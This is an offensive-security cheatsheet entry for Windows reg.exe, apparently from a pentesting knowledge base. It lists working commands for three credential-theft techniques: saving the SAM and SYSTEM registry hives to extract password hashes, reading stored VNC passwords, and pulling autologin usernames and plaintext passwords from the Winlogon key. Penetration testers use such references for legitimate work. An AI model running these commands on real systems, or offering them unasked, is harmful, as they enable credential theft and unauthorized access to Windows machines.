---
id: e21bc36c-7806-417d-83a2-f6076db329ec
name: reg.exe
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:55.578660+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# reg.exe

**Command** ([[dump sam database]]):

```bash
reg save HKLM\sam sam
reg save HKLM\system system

```

**Command** ([[query vnc passwords]]):

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"

```

**Command** ([[Windows autologin]]):

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

```
